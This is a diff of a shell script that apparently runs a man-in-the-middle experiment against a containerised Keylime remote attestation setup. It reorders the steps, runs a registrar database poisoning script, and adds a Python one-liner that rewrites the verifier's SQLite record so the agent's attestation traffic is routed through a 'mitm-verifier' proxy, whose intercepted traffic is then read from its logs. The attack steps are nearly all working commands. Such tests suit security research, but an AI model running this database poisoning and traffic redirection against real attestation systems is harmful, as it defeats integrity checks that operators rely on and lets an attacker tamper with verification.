@@ -23,36 +23,60 @@ echo "\n\n"
 # STEP 5: Wait for agent registration
 sleep 30
 
-# STEP 6: Poison registrar database to redirect verifier->agent traffic through MITM
+# STEP 6: Add agent to verifier FIRST (before poisoning)
+echo "Adding agent to verifier..."
+docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
+sleep 5
+echo "\n\n"
+
+# STEP 7: NOW poison both databases (after agent is added)
 echo "Poisoning registrar database..."
 docker exec -it keylime-registrar python3 /poison_registrar.py
 echo "\n\n"
 
-# STEP 7: Add agent to verifier (triggers runtime attestation through MITM)
-# STEP 7: Add agent to verifier (triggers runtime attestation through MITM)
-echo "Adding agent to verifier..."
-docker exec -it keylime-verifier keylime_tenant -c delete -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000 || true
-docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
-
-# STEP 8: Monitor logs for signature verification failures
-# docker logs -f keylime-verifier
-
-# # STEP 5: View the logs for the Keylime agent - Should get a RegistrarClientBuilder Error
-echo "Viewing logs for the Keylime agent..."
-sleep 30
-docker logs keylime-agent
+echo "Poisoning verifier database cache..."
+docker exec -it keylime-verifier python3 -c "import sqlite3; conn = sqlite3.connect('/var/lib/keylime/cv_data.sqlite'); cursor = conn.cursor(); cursor.execute('''UPDATE verifiermain SET ip = \'mitm-verifier\', port = 9002 WHERE agent_id = \'d432fbb3-d2f1-4a97-9ef7-75bd81c00000\' '''); conn.commit(); print(f'Updated {cursor.rowcount} entries'); conn.close()"
 echo "\n\n"
 
-# # STEP 6: Delete agent from registrar
-# echo "Deleting agent from registrar..."
-# docker exec -it keylime-verifier keylime_tenant -c delete -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
-# echo "\n\n"
+# STEP 8: Wait for next attestation cycle (verifier will use poisoned DB)
+echo "Waiting 30 seconds for next attestation cycle..."
+sleep 30
+echo "\n\n"
 
-# # STEP 7: Add agent to tenant for monitoring (from verifier container) - Will run into an error that the TPM Quote is invalid for the nonce...
-# echo "Adding agent to tenant for monitoring..."
-# docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
-# echo "\n\n"
+# STEP 9: Monitor MITM traffic
+echo "Monitoring MITM proxy for intercepted traffic..."
+docker logs keylime-mitm-verifier | tail -50
+echo "\n\n"
 
-# # STEP 8: Check agent status (shows registration and attestation info) - Will get an error that the agent exists in the registrar's database but not in the verifier's
+# STEP 10: Check agent status
 echo "Checking agent status..."
 docker exec -it keylime-verifier keylime_tenant -c status -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
+
+# # STEP 7: Add agent to verifier (triggers runtime attestation through MITM)
+# # STEP 7: Add agent to verifier (triggers runtime attestation through MITM)
+# echo "Adding agent to verifier..."
+# docker exec -it keylime-verifier keylime_tenant -c delete -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000 || true
+# docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
+
+# # STEP 8: Monitor logs for signature verification failures
+# # docker logs -f keylime-verifier
+
+# # # STEP 5: View the logs for the Keylime agent - Should get a RegistrarClientBuilder Error
+# echo "Viewing logs for the Keylime agent..."
+# sleep 30
+# docker logs keylime-agent
+# echo "\n\n"
+
+# # # STEP 6: Delete agent from registrar
+# # echo "Deleting agent from registrar..."
+# # docker exec -it keylime-verifier keylime_tenant -c delete -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
+# # echo "\n\n"
+
+# # # STEP 7: Add agent to tenant for monitoring (from verifier container) - Will run into an error that the TPM Quote is invalid for the nonce...
+# # echo "Adding agent to tenant for monitoring..."
+# # docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
+# # echo "\n\n"
+
+# # # STEP 8: Check agent status (shows registration and attestation info) - Will get an error that the agent exists in the registrar's database but not in the verifier's
+# echo "Checking agent status..."
+# docker exec -it keylime-verifier keylime_tenant -c status -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
